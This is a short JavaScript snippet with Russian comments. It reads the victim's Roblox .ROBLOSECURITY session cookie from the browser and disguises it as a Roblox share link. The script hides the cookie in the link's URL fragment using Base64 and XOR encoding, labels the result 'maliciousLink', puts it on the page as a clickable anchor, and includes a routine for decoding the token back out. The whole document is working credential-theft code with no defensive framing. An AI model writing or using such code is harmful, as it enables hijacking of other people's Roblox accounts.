// Простая маскировка токена (например, .ROBLOSECURITY) под ссылку Roblox
// Токен встраивается во фрагмент (часть после #) — не отправляется на сервер, но доступен в URL.

(function() {
    // 1. Целевая ссылка (предоставлена пользователем)
    const baseLink = "https://www.roblox.com/share?code=39a503a89e17af4c8fb7d6e1d51d319c&type=Server";
    
    // 2. Получение токена (в реальном сценарии — из куки .ROBLOSECURITY)
    let token = "";
    const cookies = document.cookie.split('; ');
    for(let c of cookies) {
        let [name, val] = c.split('=');
        if(name === '.ROBLOSECURITY') {
            token = val;
            break;
        }
    }
    // Если токен не найден — тестовый (замените на реальный)
    if(!token) token = "TEST_TOKEN_12345";
    
    // 3. Простое кодирование (Base64 + сдвиг символов для маскировки)
    function simpleMask(str) {
        let b64 = btoa(str);
        let masked = "";
        for(let i=0; i<b64.length; i++) {
            masked += String.fromCharCode(b64.charCodeAt(i) ^ 0x42);
        }
        return btoa(masked);
    }
    
    // 4. Раскодирование (для извлечения)
    function simpleUnmask(maskedStr) {
        let unmasked = atob(maskedStr);
        let orig = "";
        for(let i=0; i<unmasked.length; i++) {
            orig += String.fromCharCode(unmasked.charCodeAt(i) ^ 0x42);
        }
        return atob(orig);
    }
    
    // 5. Маскировка токена
    let camouflagedToken = simpleMask(token);
    
    // 6. Вставка во фрагмент ссылки (camouflage)
    let maliciousLink = baseLink + "#" + encodeURIComponent(camouflagedToken);
    
    // 7. Вывод результата (например, в консоль или как атрибут ссылки)
    console.log("Замаскированная ссылка:", maliciousLink);
    
    // 8. Пример извлечения токена из ссылки (если нужно)
    function extractTokenFromLink(link) {
        let fragment = link.split('#')[1];
        if(!fragment) return null;
        let encoded = decodeURIComponent(fragment);
        return simpleUnmask(encoded);
    }
    
    // Демонстрация: создание видимой ссылки на странице
    let a = document.createElement('a');
    a.href = maliciousLink;
    a.innerText = "Нажми, чтобы перейти";
    a.target = "_blank";
    document.body.appendChild(a);
    
    // Если нужно просто получить строку — используйте переменную maliciousLink
})();